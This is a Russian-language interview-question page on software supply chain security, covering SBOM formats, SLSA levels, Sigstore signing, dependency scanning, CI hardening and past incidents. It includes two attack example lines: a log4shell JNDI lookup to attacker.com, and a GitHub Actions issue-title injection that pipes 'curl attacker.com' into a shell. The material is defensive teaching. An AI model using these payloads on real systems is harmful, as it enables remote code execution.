---
title: "Вопросы на собеседовании: Supply Chain Security"
description: "Software supply chain security: SBOM, SLSA, Sigstore, Cosign, Dependabot, Trivy, SolarWinds, log4shell, xz backdoor, CycloneDX, SPDX, signed artifacts"
tags:
  - interview
  - security
  - supply-chain-security-interview
aliases:
  - "Supply Chain Security interview"
  - "SBOM interview"
  - "SLSA framework"
  - "Supply Chain собеседование"
difficulty: "intermediate"
updated: "2026-04-19"
---
# Вопросы на собеседовании: `Supply Chain Security`

`Software Supply Chain Security` — защита кода, dependencies, build-process, artifacts от **tampering и compromise**. После incidents — **SolarWinds (2020)**, **log4shell (2021)**, **xz utils backdoor (2024)** — стало **top priority**. Инструменты: **SBOM** (bill of materials), **SLSA** (framework), **Sigstore/Cosign** (signing), **Dependabot/Trivy** (scanning).

## Полезные ссылки

### Официальная документация и авторитетные источники

- [SLSA Framework](https://slsa.dev/) — supply chain levels
- [Sigstore](https://www.sigstore.dev/) — keyless signing
- [CycloneDX SBOM](https://cyclonedx.org/) — OWASP SBOM standard
- [SPDX](https://spdx.dev/) — Linux Foundation SBOM standard
- [CNCF Software Supply Chain Best Practices](https://github.com/cncf/tag-security/blob/main/supply-chain-security/supply-chain-security-paper/CNCF_SSCP_v1.pdf)
- [NIST SSDF (SP 800-218)](https://csrc.nist.gov/publications/detail/sp/800-218/final)

## Содержание

- [Полезные ссылки](#полезные-ссылки)
- [See also](#see-also)

**Базовые понятия**
- [Q1. (!) Что такое supply chain attack?](#q1--что-такое-supply-chain-attack)
- [Q2. (!) Известные incidents (SolarWinds, log4shell, xz)?](#q2--известные-incidents-solarwinds-log4shell-xz)
- [Q3. (!) Типы supply chain attacks?](#q3--типы-supply-chain-attacks)

**SBOM**
- [Q4. (!) Что такое SBOM?](#q4--что-такое-sbom)
- [Q5. (!) SPDX vs CycloneDX?](#q5--spdx-vs-cyclonedx)
- [Q6. Как генерировать SBOM?](#q6-как-генерировать-sbom)

**SLSA**
- [Q7. (!) Что такое SLSA framework?](#q7--что-такое-slsa-framework)
- [Q8. (!) SLSA levels 1-4?](#q8--slsa-levels-1-4)

**Signing**
- [Q9. (!) Зачем подписывать artifacts?](#q9--зачем-подписывать-artifacts)
- [Q10. (!) Sigstore и Cosign?](#q10--sigstore-и-cosign)
- [Q11. Keyless signing (Fulcio, Rekor)?](#q11-keyless-signing-fulcio-rekor)
- [Q12. In-toto attestations?](#q12-in-toto-attestations)

**Dependency scanning**
- [Q13. (!) Dependabot vs Renovate?](#q13--dependabot-vs-renovate)
- [Q14. (!) Trivy, Snyk, Grype — сравнение?](#q14--trivy-snyk-grype--сравнение)
- [Q15. CVE vs GHSA database?](#q15-cve-vs-ghsa-database)

**Build integrity**
- [Q16. (!) Reproducible builds?](#q16--reproducible-builds)
- [Q17. Hermetic builds (Bazel, Nix)?](#q17-hermetic-builds-bazel-nix)
- [Q18. Provenance (who built what)?](#q18-provenance-who-built-what)

**CI/CD security**
- [Q19. (!) GitHub Actions supply chain risks?](#q19--github-actions-supply-chain-risks)
- [Q20. OIDC для CI (без long-lived credentials)?](#q20-oidc-для-ci-без-long-lived-credentials)
- [Q21. Pinned dependencies (hash vs version)?](#q21-pinned-dependencies-hash-vs-version)

**Practical**
- [Q22. (!) Как защититься от typosquatting?](#q22--как-защититься-от-typosquatting)
- [Q23. (!) Vendor risk assessment?](#q23--vendor-risk-assessment)
- [Q24. Supply chain security roadmap?](#q24-supply-chain-security-roadmap)

## Q1. (!) Что такое supply chain attack?

**Supply chain attack** — атака **не на target прямо**, а через **trusted intermediaries**: вендоры, dependencies, build tools, CI/CD.

**Идея:** если вы не можете пробить defended organization, **compromise их supplier**. Их update pipe доставит malware **от вашего имени** (trusted).

**Attack surface:**
```
Source code → Build → Artifact → Distribution → Install → Runtime
     ↑           ↑         ↑           ↑            ↑         ↑
   steal      inject    tamper      MITM        compromise  execute
   secret     malware   binary                  package
```

**Почему effective:**
- Software trusts dependencies implicitly (thousands of transitive deps)
- Updates auto-applied (trust vendor signatures)
- Compromising **1 popular lib** = thousands victims
- Detection difficult (malicious commit хорошо спрятан)

**Real-world:**
- NPM packages с 1M+ downloads compromised через stolen maintainer credentials
- Docker Hub images with cryptominers
- PyPI typosquatting (`requests` vs `reqeusts`)

**Impact:** **downstream explosion** — 1 compromise → hundreds orgs.

## Q2. (!) Известные incidents (SolarWinds, log4shell, xz)?

**SolarWinds / SUNBURST (Dec 2020):**
- APT group (Russian SVR) compromised **SolarWinds Orion** (network monitoring)
- Malicious code в update signed SolarWinds cert
- **18,000+ customers** downloaded backdoor; ~100 actively exploited
- Victims: US Treasury, DHS, Microsoft, FireEye
- Lesson: build pipeline compromise → signed malware

**log4shell / CVE-2021-44228 (Dec 2021):**
- **Apache log4j 2.x** RCE — JNDI injection через log message
- `${jndi:ldap://attacker.com/exploit}` в any logged string → RCE
- **CVSS 10.0** — максимум severity
- **Везде:** Minecraft, iCloud, Steam, millions apps
- Lesson: transitive dep vulnerabilities; SBOM нужен; patch time critical

**xz utils backdoor / CVE-2024-3094 (Mar 2024):**
- Long-term **social engineering**: attacker "Jia Tan" 2+ years contributed xz utils (compression lib)
- Became maintainer, inserted **backdoor** в `liblzma` → SSH auth bypass
- Affected Debian/Ubuntu unstable; **caught by accident** by Microsoft engineer (sshd slow)
- Lesson: single-maintainer critical infra vulnerable; human factor

**codecov (2021):** CI coverage tool compromised → env vars экspеrfiltrated many orgs.

**event-stream (2018):** NPM package transferred to attacker → malicious code to steal Bitcoin wallets.

**Summary:** build-time, dependency, и **human** are all attack vectors.

## Q3. (!) Типы supply chain attacks?

**По вектору:**

**1. Dependency confusion:**
- Attacker publishes package с тем же именем на public registry; CI fetches attacker's version вместо private
- Fixed: explicit scopes, internal registry priority

**2. Typosquatting:**
- Lookalike names: `urllib` vs `urllib3` vs `ur11ib3` → installed by typo

**3. Protestware / maintainer action:**
- Legit maintainer adds malicious code (politics, burnout, sold rights)
- Example: `node-ipc` 2022 — maintainer added code deleting files on Russian IPs

**4. Compromised account:**
- Stolen npm/PyPI creds → publish malicious version
- Example: ua-parser-js, coa, rc (2021)

**5. Build system compromise:**
- Attacker injects into CI → signed artifact contains malware
- Example: SolarWinds

**6. Source repo compromise:**
- Push to GitHub via stolen token
- Example: PHP Git server (2021) — attackers pushed backdoor to php-src

**7. Upstream vuln:**
- Transitive dep has CVE (e.g., log4shell in any Java app)

**8. Dormant / long-con:**
- Build trust for years, then inject (xz)

**9. Package swap / hijack:**
- Attacker registers abandoned package name

**10. CDN / mirror attack:**
- Tamper in distribution layer

**Controls:** SBOM, signing, SLSA, dependency review, pinned versions, reproducible builds.

## Q4. (!) Что такое SBOM?

**SBOM (Software Bill of Materials)** — **inventory** всех components (direct + transitive) в software: libraries, versions, licenses, origins.

**Analogy:** как **food ingredients label** — "содержит: wheat, soy, ..." — но для software.

**Зачем:**
- **Vulnerability response:** log4shell — "есть ли у нас log4j?" SBOM даёт instant answer
- **License compliance:** какие GPL/AGPL в codebase?
- **Regulatory:** US Executive Order 14028 (2021) — SBOM required для federal software; EU CRA (2024)
- **Vendor due diligence:** knowing what's inside before buying

**Content:**
```json
{
  "component": "spring-core",
  "version": "5.3.20",
  "supplier": "VMware",
  "license": "Apache-2.0",
  "hash": "sha256:abc123...",
  "dependencies": ["spring-jcl:5.3.20", ...]
}
```

**Formats:**
- **SPDX** (Linux Foundation) — ISO standard
- **CycloneDX** (OWASP) — security-focused
- **SWID tags** — older, less common

**Generation:** automated at build time (not manually maintained).

**Depth:** ideally **transitive + file-level hashes** (know exact bytes shipped).

## Q5. (!) SPDX vs CycloneDX?

**SPDX:**
- Linux Foundation, **ISO/IEC 5962:2021**
- Focus: **licensing, compliance, metadata**
- Formats: Tag-Value, JSON, YAML, RDF/XML
- Deeply integrated с legal review
- Less security-focused

**CycloneDX:**
- OWASP project (2017)
- Focus: **security, vulnerabilities**
- Formats: JSON, XML, Protobuf
- Native VEX (Vulnerability Exploitability eXchange) support
- Services, frameworks, ML models, crypto (SBOM variants: SaaSBOM, MLBOM, CBOM)

**Comparison:**

| Aspect | SPDX | CycloneDX |
|--------|------|-----------|
| Origin | Linux Foundation | OWASP |
| Focus | Compliance/license | Security |
| Age | 2011 | 2017 |
| Size | Verbose | Compact |
| Ecosystem | Strong in FOSS/legal | Strong in security tooling |
| Tools | Syft, SPDX tools | Syft, CycloneDX CLI |

**Pragmatic:** **both generated** сейчас (tooling supports обе) — CycloneDX чаще для security workflows, SPDX для legal/compliance.

**Industry trend:** most orgs generate **both** (tools like `syft` support one-command for каждой).

## Q6. Как генерировать SBOM?

**Language-specific tools:**

**Java (Maven):**
```xml
<plugin>
  <groupId>org.cyclonedx</groupId>
  <artifactId>cyclonedx-maven-plugin</artifactId>
</plugin>
```
`mvn cyclonedx:makeAggregateBom` → `target/bom.json`

**Node.js:**
```bash
npm sbom --sbom-format=cyclonedx  # npm 10+
# or:
npx @cyclonedx/cyclonedx-npm --output-file sbom.json
```

**Python:**
```bash
cyclonedx-py --format json -o sbom.json
```

**Go:**
```bash
cyclonedx-gomod mod -output sbom.json
```

**Universal: Syft (Anchore):**
```bash
syft dir:. -o cyclonedx-json > sbom.json
syft image:myapp:1.0 -o spdx-json > sbom.json
```

**Container images:**
```bash
# Docker (Docker 23+)
docker sbom myapp:1.0

# Buildx builds with SBOM attestation
docker buildx build --sbom=true --push ...
```

**In CI/CD (GitHub Actions):**
```yaml
- uses: anchore/sbom-action@v0
  with:
    format: cyclonedx-json
    output-file: sbom.json
```

**Store as artifact** и **attach to release**; also push to dependency-track server для continuous monitoring.

## Q7. (!) Что такое SLSA framework?

**SLSA (Supply-chain Levels for Software Artifacts)** — **pronounce "salsa"** — framework от Google/Linux Foundation. Defines **maturity levels** для build pipeline security.

**Цель:** доказать что artifact **built as claimed** (no tampering).

**Threats addressed:**
- **Source integrity:** tampering commits, stolen creds
- **Build integrity:** malicious build tool, parallel build hijack
- **Distribution integrity:** swapped binaries на mirror

**Key concepts:**
- **Provenance:** metadata — **где/как/кем** built artifact
- **Attestations:** signed statements ("build passed tests", "scanned for CVEs")
- **Trusted builders:** isolated, auditable CI

**Non-goals:**
- Не сам code quality / correctness (это separate)
- Не runtime security
- Не prevents bugs в dependencies

**Adoption:** Google internal, GitHub Actions (SLSA L3 builder), Kubernetes.

**Version:** 1.0 released 2023.

## Q8. (!) SLSA levels 1-4?

**L1 — Documented build process:**
- Build script exists
- Generates provenance (automated, non-falsified)
- Minimal effort, basic

**L2 — Hosted build:**
- Version control used
- Hosted build service (GitHub Actions, CircleCI — not local laptop)
- Signed provenance
- Protects против casual tampering

**L3 — Hardened build:**
- **Isolated builder** (no parallel tenant interference)
- **Non-falsifiable provenance** (ephemeral identity, OIDC)
- Source + build platform **enforced** (no bypassing)
- Example: GitHub Actions with `slsa-github-generator`

**L4 — originally most strict (retired in 1.0):**
- Two-person review всех changes
- Hermetic + reproducible builds
- Stricter than most orgs tolerate

**SLSA 1.0 (2023):**
- Only **Build track** standardized (Source и Dependency tracks WIP)
- Levels: Build L1, L2, L3
- L4 dropped — focus on realistic adoption

**Pragmatic path:**
1. **L1** — few days
2. **L2** — move builds to trusted CI, sign artifacts
3. **L3** — use SLSA generator, enforce provenance checks

**Consumers:** verify `slsa-verifier` checks provenance before deploying.

## Q9. (!) Зачем подписывать artifacts?

**Signing** — **digital signature** на artifact (JAR, Docker image, binary) с private key → consumer verifies с public key.

**Что даёт:**
- **Authenticity:** artifact действительно от claimed publisher
- **Integrity:** не modified after signing
- **Non-repudiation:** publisher не может отрицать authorship

**Без signing:**
- MITM attack: swap package в transit
- Compromised mirror: serve malware
- CDN / cache poisoning

**Examples:**
- **Apt:** GPG signatures on `.deb` packages; `apt` verifies before install
- **Maven Central:** GPG signatures on JARs (required for publishing)
- **Docker:** Notary / Cosign signatures on images
- **npm:** signatures being rolled out

**Traditional pain points:**
- Key management (where store, rotate?)
- Private key compromise = disaster
- Developer friction (sign manually? automate?)

**Modern solution:** **keyless** signing (Sigstore).

**Verification is key:** signed artifact без verification = still insecure. Enforce в deploy pipeline:
```bash
cosign verify --certificate-identity=... --certificate-oidc-issuer=... image:tag
```

## Q10. (!) Sigstore и Cosign?

**Sigstore** — Linux Foundation project (2021). **Free, keyless artifact signing**. Backed by Google, RedHat, GitHub.

**Key components:**
- **Cosign** — CLI для signing/verifying
- **Fulcio** — CA issuing short-lived certs (10 min)
- **Rekor** — transparency log (append-only, auditable)
- **Cosign** — tool combining всё

**Architecture:**
```
Developer
  ↓ "sign"
OIDC token (Google/GitHub/Microsoft)
  ↓ (проверяет identity)
Fulcio CA → ephemeral cert (valid 10 min)
  ↓ signs artifact
Cosign → uploads signature + cert
  ↓
Rekor (transparency log) ← immutable record
```

**Advantages:**
- **No long-lived keys** (никогда не compromised)
- **Identity = OIDC** (developer email, GitHub repo)
- **Auditable** (Rekor log)
- **Free** (public service)

**Cosign sign image:**
```bash
cosign sign --yes ghcr.io/myorg/app:1.0
# Opens browser → sign in with Google/GitHub
# Cert issued, artifact signed, entry в Rekor
```

**Verify:**
```bash
cosign verify \
  --certificate-identity=https://github.com/myorg/build.yml@refs/heads/main \
  --certificate-oidc-issuer=https://token.actions.githubusercontent.com \
  ghcr.io/myorg/app:1.0
```

**Hardcore trust:** verify identity matches expected GitHub workflow path → ensures artifact built by **your** CI, not attacker.

## Q11. Keyless signing (Fulcio, Rekor)?

**Keyless** — signing без **long-lived private key**. Key exists только for 10 minutes.

**How:**

1. **Developer authenticates** via OIDC (SSO identity)
2. **Fulcio** (CA) verifies OIDC token → issues X.509 cert binding identity → ephemeral keypair
3. **Cosign** signs artifact с ephemeral key
4. Signature + cert + Rekor entry stored

**Ephemeral key destroyed** after signing. Even if stolen, expires in 10 min.

**Fulcio (CA):**
- Public CA (operated by Linux Foundation)
- Issues cert binding (email / subject) → pubkey
- Trust anchor: Sigstore root cert

**Rekor (transparency log):**
- Append-only Merkle tree (like Certificate Transparency)
- Every signature recorded
- Public queryable
- Detects retroactive tampering (signer can't "unpublish")

**Verification без private key:**
- Cert has short validity
- Verify cert chain to Sigstore root
- Check Rekor for entry existence и timestamp (signature made during cert validity)

**Example:**
```bash
# Identity from GitHub Actions workflow
cosign sign-blob --yes artifact.tar.gz  # no key file!
```

**Security win:** no "store the key safely" problem. Key never exists outside ephemeral CI job.

## Q12. In-toto attestations?

**in-toto** — framework defining **structured signed statements** об artifact.

**Attestation** — signed JSON:
```json
{
  "subject": [{"name": "myapp", "digest": {"sha256": "abc123..."}}],
  "predicateType": "https://slsa.dev/provenance/v1",
  "predicate": {
    "buildDefinition": {...},
    "runDetails": {
      "builder": {"id": "https://github.com/actions/runner"},
      "metadata": {"invocationID": "..."}
    }
  }
}
```

**Predicates (типы statements):**
- `slsa-provenance` — SLSA provenance
- `cyclonedx` — SBOM attestation
- `vuln` — vulnerability scan result
- `test` — test results passed
- `policy` — custom policy compliance

**Flow:**
```
Source commit
  ↓ (attest: code reviewed by X)
Build
  ↓ (attest: SLSA provenance)
Test
  ↓ (attest: tests passed)
Scan
  ↓ (attest: no critical CVEs)
Deploy
  ↓ (policy checks all attestations)
```

**Enforcement:** admission controller (Kyverno, Gatekeeper) blocks deploy without required attestations.

**Example (Cosign attest):**
```bash
cosign attest --predicate sbom.json --type cyclonedx image:tag
cosign attest --predicate scan.json --type vuln image:tag
```

**Verify:**
```bash
cosign verify-attestation --type cyclonedx --certificate-identity=... image:tag
```

**Chain of trust:** consumers build policy requiring specific predicates с specific builders → trusted artifact.

## Q13. (!) Dependabot vs Renovate?

**Оба:** automated dependency updates (PRs to update libs).

**Dependabot (GitHub):**
- Native в GitHub (free для all repos)
- Config: `.github/dependabot.yml`
- Per-dep PRs (one PR per update)
- Security advisories от GitHub Advisory Database
- Automatic grouping (v2)
- Works with: npm, Maven, pip, Cargo, Go modules, Gradle, NuGet, composer, Docker, GitHub Actions

**Renovate (Mend):**
- Open source, self-hosted or cloud
- More configurable (presets, regex, custom managers)
- Grouping и merge strategies more flexible
- Support more package managers (Helm, Terraform, Kubernetes manifests)
- **Auto-merge** configurable (e.g., auto-merge patches)

**Comparison:**

| Aspect | Dependabot | Renovate |
|--------|------------|----------|
| Setup | Zero (GitHub) | Add bot/workflow |
| Config | Simple YAML | Rich JSON |
| Grouping | Basic | Powerful |
| Custom managers | Limited | Regex custom |
| Auto-merge | Less flexible | Flexible |
| Schedule | Fixed cadence | Cron-style |
| Ecosystems | Common | Broader |

**Выбор:**
- **Dependabot** — default для GitHub, small/medium repos, simplicity
- **Renovate** — large monorepo, need customization, GitLab, многоязычный stack

**Best practice:**
- Enable security updates (auto-PR on CVE)
- Weekly schedule для version updates (avoid daily noise)
- Group minor/patch updates (prefer fewer PRs)
- CI must pass before merge

## Q14. (!) Trivy, Snyk, Grype — сравнение?

**Trivy (Aqua Security):**
- **Free, open source**
- Scans: container images, filesystems, git repos, K8s clusters, SBOM, IaC (Terraform), secrets
- Fast, comprehensive
- CI-friendly (SARIF output for GitHub)
- Used extensively (de facto open source leader)

**Snyk:**
- **Commercial** (free tier limited)
- Scans: code (SAST), dependencies, containers, IaC
- Rich fix suggestions (auto-PR)
- Vulnerability DB proprietary (often ahead of public)
- Deep integrations (IDE, CI, PR comments)

**Grype (Anchore):**
- Free, open source
- Focuses on **vulnerability scanning** of SBOMs и images
- Pairs with **Syft** (SBOM gen)
- Simple, fast

**Comparison:**

| Aspect | Trivy | Snyk | Grype |
|--------|-------|------|-------|
| License | Free | Commercial | Free |
| CVE DB | NVD, OSV, GHSA | Proprietary + public | NVD, GHSA |
| Scope | Broad (IaC, secrets, SBOM) | Broad (SAST too) | Focused (vuln) |
| Fix suggestions | Basic | Rich | Basic |
| SBOM gen | Yes | No | No (needs Syft) |
| IDE plugins | Limited | Rich | None |

**Typical stack:**
- **Dev**: Snyk (rich IDE integration) or Trivy
- **CI**: Trivy (free, fast)
- **Registry**: Trivy scanning / ECR scan
- **Runtime**: Falco + Kubescape

**False positives:** all have some; VEX (CycloneDX) позволяет отметить "not exploitable".

## Q15. CVE vs GHSA database?

**CVE (Common Vulnerabilities and Exposures):**
- **MITRE** maintains; funded by US DHS
- **CVE ID:** `CVE-2021-44228` (log4shell)
- Global canonical identifier
- **NVD** (National Vulnerability Database) — NIST analyzes и scores
- Lag: days/weeks between disclosure и CVE assignment

**GHSA (GitHub Security Advisories):**
- GitHub-maintained database
- `GHSA-xxxx-xxxx-xxxx`
- Often **faster** — maintainers publish там до CVE
- Rich metadata: affected versions, patches, references
- Maps to CVE when assigned

**OSV (Open Source Vulnerabilities):**
- Google-initiated unified format
- Aggregates: GHSA, PyPI, npm, RustSec, GSD
- Machine-readable JSON
- API: `osv.dev`

**How scanners use:**
- Dependabot → GHSA (GitHub-native)
- Trivy → NVD + GHSA + OSV + language-specific
- Snyk → proprietary + public

**ID mapping:** one vuln может иметь GHSA + CVE + vendor advisory. Tools deduplicate.

**Severity:** **CVSS score** (0-10) — computed by NVD / vendor. Но **CVSS often не reflects exploitability в твоём context** (VEX помогает).

**CVSS 4.0 (2023):** improved, но adoption slow; CVSS 3.1 still dominant.

## Q16. (!) Reproducible builds?

**Reproducible build** — same source → **identical byte-for-byte** binary, regardless когда/где/кем built.

**Зачем:**
- **Verify:** anyone can rebuild и compare hash → trust published binary
- **Detects tampering:** SolarWinds-style attack — discrepancy caught
- **SLSA Level 4** component

**Challenges (non-determinism):**
- Timestamps embedded в artifacts
- Random IDs (UUIDs)
- Path dependencies (`/home/user/project` vs `/builds/project`)
- Parallel compile order
- Locale / timezone (e.g., sorted by locale)
- Compiler versions differing

**Fixes:**
- **`SOURCE_DATE_EPOCH`** — env var for fixed timestamp
- Stable sort outputs
- Stripped paths
- Pinned compiler, deterministic flags

**Tools:**
- **reproducible-builds.org** — standard + tools
- **diffoscope** — diff two binaries deeply
- **Debian reproducible builds** — 96%+ Debian packages reproducible
- **Nix** — designed for reproducibility

**Language:**
- Go — mostly reproducible (since 1.10)
- Rust — reproducible с effort
- Java JAR — requires care (timestamps in ZIP)

**Real-world:** Bitcoin Core, Tor — reproducible; multiple devs rebuild, compare.

**Limit:** не covers sources **itself** (source can be malicious even если reproducibly builds).

## Q17. Hermetic builds (Bazel, Nix)?

**Hermetic build** — build reads **ONLY declared inputs** (source + explicitly listed deps). No network, no system state, no implicit dependencies.

**Differences from reproducible:**
- Reproducible: output = same bytes
- Hermetic: inputs = fully declared
- Hermetic → помогает reproducible (но reproducible possible без hermeticity)

**Why important:**
- **No "works on my machine"** — system libs не leak in
- **Cache correctness** — если declared inputs unchanged, cached output valid
- **Security:** no network during build — can't pull malicious deps at build time
- **SLSA L3+** требует

**Tools:**

**Bazel:**
- Google's build system (for Java, Go, C++, Python)
- Sandboxed builds: workers in chroot/containers
- Declared deps in `BUILD` files
- Remote cache + remote execution

**Nix:**
- Functional package manager
- `nix build` runs in sandbox, deterministic
- Reproducible with cryptographic hashes of inputs
- Pure functions: `drv(inputs) → output`

**Others:**
- **Buck** (Meta) — like Bazel
- **Pants** (Toolchain)

**Practical challenge:**
- Retrofitting existing Makefile project — large effort
- Green-field: adopt Bazel/Nix from start

**ROI:**
- Huge monorepo (Google, Meta) — essential (cache hits 90%+)
- Small repo — overkill

## Q18. Provenance (who built what)?

**Provenance** — signed metadata describing **origins** artifact: commit, builder, timestamp, environment.

**SLSA Provenance schema (v1):**
```json
{
  "buildDefinition": {
    "buildType": "https://github.com/slsa-framework/slsa-github-generator/generic@v1",
    "externalParameters": {
      "source": "git+https://github.com/myorg/myrepo@sha1:abc123"
    },
    "resolvedDependencies": [...]
  },
  "runDetails": {
    "builder": {"id": "https://github.com/actions/runner"},
    "metadata": {
      "invocationID": "https://github.com/myorg/myrepo/actions/runs/1234",
      "startedOn": "2024-01-15T10:00:00Z",
      "finishedOn": "2024-01-15T10:05:00Z"
    }
  }
}
```

**Zachyy:**
- Trust: "this JAR built by our GitHub Actions from commit X" — verifiable
- Incident response: compromised lib — все artifacts pointing к нему findable
- SLSA L3+: non-falsifiable (builder signs, developer can't forge)

**Generation:**
- GitHub Actions: `slsa-github-generator` official action
- GitLab: own provenance since 2023
- Tekton Chains: adds provenance к all builds

**Verification:**
```bash
slsa-verifier verify-artifact myapp.tar.gz \
  --source-uri github.com/myorg/myrepo \
  --source-tag v1.0 \
  --provenance-path myapp.intoto.jsonl
```

**Policy:** admission controller verifies provenance matches expected repo + branch.

## Q19. (!) GitHub Actions supply chain risks?

**Risk surface GitHub Actions:**

**1. Compromised 3rd-party actions:**
- Pinning to branch (`@main`) → any commit runs. Attacker compromises action → all consumers run malicious code
- **Fix:** pin to **commit SHA**: `uses: org/action@abc123...`
- Dependabot updates SHA with review

**2. Pwn requests:**
- `pull_request_target` event runs с write permissions на fork PR
- Attacker's fork code executes с secrets
- Fix: avoid `pull_request_target` or use `pull_request` (no secrets)

**3. Secret leakage:**
- Action prints secret in log (even accidentally)
- `echo "token: $TOKEN"` → exposed
- GitHub redacts known secrets, но не всегда catches

**4. Runner privilege escalation:**
- Self-hosted runners reusable → prior job state persists
- Attacker PR → runner → compromises future jobs
- Fix: ephemeral runners; don't use self-hosted для public repos

**5. Workflow injection:**
- Using `${{ github.event.issue.title }}` in shell:
  ```yaml
  run: echo "${{ github.event.issue.title }}"
  ```
- Title: `"); curl attacker.com | sh # ` → injected
- Fix: **always quote properly** or use env:
  ```yaml
  env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"
  ```

**6. Token permissions:**
- `GITHUB_TOKEN` default permissions broad
- Minimize: `permissions: contents: read` в job

**Defense-in-depth:**
- `allowed_actions` в org settings (allowlist)
- Required reviewers on environment secrets
- Hardened runners (`actions/checkout@...` pinned)
- OIDC to cloud (no stored credentials)
- Scan workflows с Semgrep rules

## Q20. OIDC для CI (без long-lived credentials)?

**Problem:** CI needs AWS/GCP/Azure creds → stored secrets → leak risk.

**Solution: OIDC workload federation.** CI provider (GitHub, GitLab, CircleCI) issues JWT → cloud provider trusts JWT → short-lived creds.

**GitHub Actions → AWS:**
```yaml
permissions:
  id-token: write  # allows OIDC token issuance
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123:role/deploy
      aws-region: us-east-1
```

**AWS side (trust policy):**
```json
{
  "Effect": "Allow",
  "Principal": {
    "Federated": "arn:aws:iam::123:oidc-provider/token.actions.githubusercontent.com"
  },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:ref:refs/heads/main"
    }
  }
}
```

**Flow:**
1. Workflow starts → GitHub mints JWT with claims (repo, branch)
2. Action sends JWT to AWS STS `AssumeRoleWithWebIdentity`
3. AWS verifies JWT signature (GitHub public keys) + condition (repo/branch match)
4. Returns temp creds (1 hr)

**Benefits:**
- **No long-lived keys** в secrets
- **Fine-grained trust** (per repo/branch)
- **Auditable** (CloudTrail)
- Ротация not needed

**Supported:** AWS, GCP, Azure, HashiCorp Cloud, Vault, many others.

**Best practice:** move all CI → cloud auth через OIDC; delete IAM user access keys.

## Q21. Pinned dependencies (hash vs version)?

**Version pin:**
```json
"lodash": "4.17.21"
```
- If `4.17.21` already published, locks version
- **BUT:** npm allows overwrite (rare, но possible); compromised maintainer → new tarball with same version

**Hash pin:**
```json
"lodash": "npm:lodash@4.17.21"
"integrity": "sha512-abc123..."
```
- `package-lock.json` / `yarn.lock` includes hashes
- Install verifies hash; mismatch = fail

**Why hash pin essential:**
- **Tamper detection:** if attacker republishes package с malicious code, hash mismatch
- **Reproducibility:** exact same bytes always installed

**In various ecosystems:**

**npm:**
- `package-lock.json` automatic (npm 5+)
- `npm ci` enforces lockfile

**Python (pip):**
```
requirements.txt
  lodash==4.17.21 \
    --hash=sha256:abc123...
```
- `pip-compile --generate-hashes`
- `pip install --require-hashes -r requirements.txt`

**Go:**
- `go.sum` — automatic hashes of all deps
- `GOFLAGS=-mod=readonly` fail if changed

**Docker:**
```dockerfile
FROM ubuntu@sha256:abc123...  # pin by digest, not tag
```

**Java (Maven):**
- No native hash pin; use **Maven Enforcer Plugin** with hash checking
- Или **Gradle** dependency locking

**Risk без hash pins:**
- Dependency substitution attacks
- Subverted mirrors / caches
- "Right version, wrong bytes"

## Q22. (!) Как защититься от typosquatting?

**Typosquatting** — attacker publishes package с именем похожим на popular: `electorn` vs `electron`, `reqeusts` vs `requests`.

**Defenses:**

**1. Internal package registry:**
- Private npm/PyPI mirror
- Only vetted packages allowed
- Developer `npm install X` → hits internal first

**2. Allowlists:**
- CI blocks installs of unapproved packages
- `package.json` reviewed on PR

**3. Scoped packages:**
- `@myorg/mylib` — scope reserved (prevents confusion)

**4. Scan commits для new deps:**
- New dep added → SCA review before merge
- Socket.dev / Deps.dev — surface suspicious packages

**5. Time-delay upgrade:**
- Don't auto-upgrade brand-new packages (< 7 days old)
- Gives community time to detect malicious

**6. Human review critical deps:**
- Top-N deps (logging, crypto, web framework) — review сами source

**7. Monitor for typosquats:**
- `package-name-checker` services
- Register common typos of your own packages proactively

**8. Dependency confusion prevention:**
- Register private package names on **public registry** to prevent squatting
- Configure package manager to prefer internal registry

**9. Pinned dependencies (q21):**
- Mass version injection — detected at hash mismatch

**Real examples caught:**
- `colors` package (2022) — maintainer self-sabotage; caught post-damage
- PyPI mass typosquat (hundreds packages) — auto-detected by PyPI

## Q23. (!) Vendor risk assessment?

**When onboarding 3rd-party software / SaaS:**

**Questions:**

**Security posture:**
- SOC 2 Type II / ISO 27001 certified?
- Pen-test reports available?
- Incident response plan?
- Data breach history?

**Data handling:**
- Where data stored (region, jurisdiction)?
- Encryption at rest / in transit?
- Data retention / deletion policies?
- GDPR, CCPA compliance?

**Access & auth:**
- SSO / SAML / OIDC support?
- MFA enforcement?
- RBAC / least-privilege?
- Audit logs?

**Supply chain:**
- Sub-processors disclosed?
- Dependency security practices?
- SBOM available?

**Operational:**
- SLA / uptime?
- Status page / incident communication?
- Backup and recovery?

**Tools:**
- **Whistic**, **OneTrust** — vendor management platforms
- **Security questionnaires** (SIG Lite, CAIQ)
- **OpenFINT, Trust centers** — vendor published evidence

**Ongoing:**
- Annual re-assessment
- Monitor for breaches (news, HIBP)
- Renewal checkpoint

**Critical vendors:**
- **Tier 1** (auth provider, cloud) — high scrutiny
- **Tier 2** (CMS, analytics) — medium
- **Tier 3** (utility tools) — basic

**Budget:** security review takes **weeks** для Tier 1 — start early.

## Q24. Supply chain security roadmap?

**Pragmatic adoption order:**

**Phase 1 — Visibility (weeks):**
1. Enable Dependabot on all repos
2. Generate SBOM в CI (Syft) — upload as artifact
3. Scan containers с Trivy в CI
4. GitHub code scanning (Semgrep, CodeQL)

**Phase 2 — Harden build (1-2 months):**
5. Pin actions к commit SHAs
6. Minimum `GITHUB_TOKEN` permissions
7. OIDC to cloud (replace long-lived creds)
8. Branch protection + required reviews
9. Signed commits (gitsign)

**Phase 3 — Attestations (months):**
10. Sign artifacts с Cosign (keyless)
11. SLSA L3 provenance (slsa-github-generator)
12. SBOM attestation на artifacts
13. Vuln scan attestation

**Phase 4 — Enforce (quarters):**
14. Admission controller (Kyverno) verifies signatures
15. Policy: only signed images deploy
16. Required SBOM + provenance attestation
17. Vendor risk process formal

**Phase 5 — Advanced (ongoing):**
18. Reproducible builds pilot
19. Hermetic builds (Bazel) for critical services
20. VEX statements for known false positives
21. Red team: simulate supply chain attack

**Metrics:**
- % repos with Dependabot
- % artifacts signed
- Mean time to patch CVE
- # unapproved packages blocked

**Trap:** tool sprawl. Start с 2-3 tools integrated well, then expand.

---

## See also

- [Zero Trust](zero-trust-interview.md) — комплементарная security модель
- [mTLS](mtls-interview.md) — service-to-service trust основа
